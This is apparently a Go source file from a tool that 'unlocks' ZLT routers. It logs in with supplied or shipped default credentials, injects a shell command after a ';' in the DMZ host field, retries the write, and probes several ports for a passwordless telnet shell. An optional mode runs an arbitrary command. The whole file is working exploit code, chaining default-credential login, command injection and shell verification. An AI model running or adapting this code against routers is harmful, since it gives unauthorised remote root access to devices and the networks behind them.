package zlt

import (
	"fmt"
	"strings"
	"time"
)

// UnlockOptions controls the provisioning flow.
type UnlockOptions struct {
	// Username / Password are the web credentials. When Username is empty the
	// shipped credential chain is tried instead (see ShippedCredentials).
	Username string
	Password string
	// DMZHost is a plausible DMZ address to place in front of the ';'.
	DMZHost string
	// Mode is one of ShellModeTelnet / ShellModeTelnetAlt / ShellModeCallback.
	Mode string
	// Port is the port the injected daemon should listen on (telnet modes).
	Port int
	// Command is used with ShellModeCallback.
	Command string
	// Attempts is how many times to (re)submit the write. The device applies the
	// DMZ asynchronously through its firewall daemon and a single request is
	// sometimes coalesced away, so 1 is not reliable. 0 means the default (3).
	Attempts int
	// VerifyPorts are the ports probed after injection. Firmware varies: 23 is
	// the classic, 2233 has been observed on unlocked OMN247 units, 9876 is the
	// vendor's own gated telnet.
	VerifyPorts []int
	// ProbeTimeout bounds each network operation.
	ProbeTimeout time.Duration
}

// UnlockResult reports what happened.
type UnlockResult struct {
	LoggedIn  bool
	Level     string
	Token     string
	CredUser  string
	Attempts  []LoginOutcome
	Payload   map[string]any
	Response  GenericResponse
	RawReply  string
	Shells    []ShellState
	Succeeded bool
	Notes     []string
}

// BuildPayload assembles the body for the selected mode.
func (o UnlockOptions) BuildPayload(sessionID string) (map[string]any, error) {
	switch o.Mode {
	case ShellModeTelnet, ShellModeTelnetAlt:
		return DMZPayload(sessionID, o.DMZHost, TelnetCommand(o.Port))
	case ShellModeCallback:
		return CommandPayload(sessionID, o.DMZHost, o.Command)
	default:
		return nil, fmt.Errorf("zlt: unknown mode %q", o.Mode)
	}
}

// UnlockOrchestrator performs login, injection and verification.
type UnlockOrchestrator struct {
	Client *Client
	Host   string
	Opts   UnlockOptions

	attempts []LoginOutcome
}

// login uses the explicit credential when one was supplied, otherwise it walks
// the shipped credential chain until the device accepts one.
func (u *UnlockOrchestrator) login() (LoginResult, error) {
	if u.Opts.Username != "" {
		res, err := u.Client.Login(u.Opts.Username, u.Opts.Password)
		if err != nil {
			return res, fmt.Errorf("login: %w", err)
		}
		u.attempts = []LoginOutcome{{
			Credential: Credential{User: u.Opts.Username, Pass: u.Opts.Password},
			OK:         res.Authed(),
			Level:      u.Client.Level,
			Message:    res.Message,
		}}
		return res, nil
	}

	best, attempts, err := u.Client.LoginChain(ShippedCredentials())
	u.attempts = attempts
	if err != nil {
		return LoginResult{}, err
	}
	u.Opts.Username, u.Opts.Password = best.User, best.Pass
	return LoginResult{Success: "success", Auth: "AUTH", SessionID: u.Client.SessionID, UserLevel: best.Level}, nil
}

// DefaultVerifyPorts is what unlock probes after a successful write.
func DefaultVerifyPorts() []int { return []int{23, 2233, 9876} }

// defaultAttempts is the number of DMZ writes to try before giving up.
const defaultAttempts = 3

// performInject submits the DMZ write once, forcing a state transition first.
//
// The 0 -> 1 toggle matters: process_network_service() stores TZ_ENABLE_DMZ and
// then raises firewall event 0x7005, and the firewall daemon is far more
// reliable about re-reading the saved function when the enabled flag actually
// changes than when only the ip does.
func (u *UnlockOrchestrator) performInject(payload map[string]any) (string, error) {
	disabled := map[string]any{
		"cmd":       CmdNetworkService,
		"method":    "POST",
		"subcmd":    DefaultDMZSubCmd,
		"sessionId": u.Client.SessionID,
		"enabled":   "0",
		"ip":        u.Opts.DMZHost,
	}
	_, _ = u.Client.Do(CmdNetworkService, "POST", disabled)
	raw, err := u.Client.Do(CmdNetworkService, "POST", payload)
	return string(raw), err
}

// Run executes the flow and returns a detailed result. A returned error means a
// hard failure (couldn't log in, couldn't build a payload); a nil error with
// Succeeded=false means the request was sent but verification failed.
func (u *UnlockOrchestrator) Run() (UnlockResult, error) {
	res := UnlockResult{Shells: nil}

	login, err := u.login()
	if err != nil {
		return res, err
	}
	if !login.Authed() {
		return res, fmt.Errorf("login rejected: message=%q success=%q", login.Message, login.Success)
	}
	res.LoggedIn = true
	res.Level = u.Client.Level
	res.CredUser = u.Opts.Username
	if res.CredUser == "" {
		res.CredUser = DefaultUser
	}
	res.Attempts = u.attempts

	// The tier is reported for the operator's benefit only. The 172/6 handler is
	// gated on session validity, not on account level, so level 1 is never a
	// precondition - do not gate the flow on it.
	if res.Level != "" && !LevelIsSuper(res.Level) {
		res.Notes = append(res.Notes, fmt.Sprintf(
			"device reports level %s (not super) - expected, and irrelevant to the injection", res.Level))
	}

	payload, err := u.Opts.BuildPayload(u.Client.SessionID)
	if err != nil {
		return res, err
	}
	res.Payload = payload

	attempts := u.Opts.Attempts
	if attempts <= 0 {
		attempts = defaultAttempts
	}
	ports := u.Opts.VerifyPorts
	if len(ports) == 0 {
		ports = DefaultVerifyPorts()
	}
	// Always include the configured port.
	want := u.Opts.Port
	if u.Opts.Mode == ShellModeCallback && want == 0 {
		want = 23
	}
	if want != 0 {
		found := false
		for _, p := range ports {
			if p == want {
				found = true
			}
		}
		if !found {
			ports = append([]int{want}, ports...)
		}
	}

	for i := 1; i <= attempts; i++ {
		raw, err := u.performInject(payload)
		if err != nil {
			// The device frequently closes the connection instead of replying when
			// the injected daemon is spawned; treat that as "sent, verify anyway".
			res.Notes = append(res.Notes, fmt.Sprintf("attempt %d: request did not return cleanly: %v", i, err))
		} else {
			res.RawReply = strings.TrimSpace(raw)
			if strings.Contains(res.RawReply, noAuthMarker) {
				return res, fmt.Errorf("device rejected the session (%s) - credentials or session id wrong", noAuthMarker)
			}
			if strings.Contains(res.RawReply, "\"success\":true") {
				res.Response.Success = true
			}
		}

		// Give the firewall daemon a moment to apply and the daemon to bind.
		time.Sleep(2 * time.Second)

		res.Shells = res.Shells[:0]
		for _, p := range ports {
			st := ProbeShell(u.Host, p, u.Opts.ProbeTimeout)
			res.Shells = append(res.Shells, st)
			if st.Open && st.NoAuth {
				res.Succeeded = true
			}
		}
		if res.Succeeded {
			if i > 1 {
				res.Notes = append(res.Notes, fmt.Sprintf("shell appeared on attempt %d of %d", i, attempts))
			}
			return res, nil
		}
		if i < attempts {
			res.Notes = append(res.Notes, fmt.Sprintf(
				"attempt %d of %d: write accepted but no shell yet - retrying", i, attempts))
		}
	}

	res.Notes = append(res.Notes, fmt.Sprintf(
		"the write was accepted %d times but no passwordless shell appeared on %v.\n"+
			"  The device applies DMZ asynchronously; if the saved value is correct "+
			"(mdlcfg -g TZ_DMZ_DEST_IP) the payload usually fires on the next firewall "+
			"rebuild or boot. Re-run, or check whether another daemon already holds the port.",
		attempts, ports))
	return res, nil
}

// VerifyOnly probes without injecting. Useful against devices that were already
// provisioned.
func VerifyOnly(host string, ports []int, timeout time.Duration) []ShellState {
	out := make([]ShellState, 0, len(ports))
	for _, p := range ports {
		out = append(out, ProbeShell(host, p, timeout))
	}
	return out
}
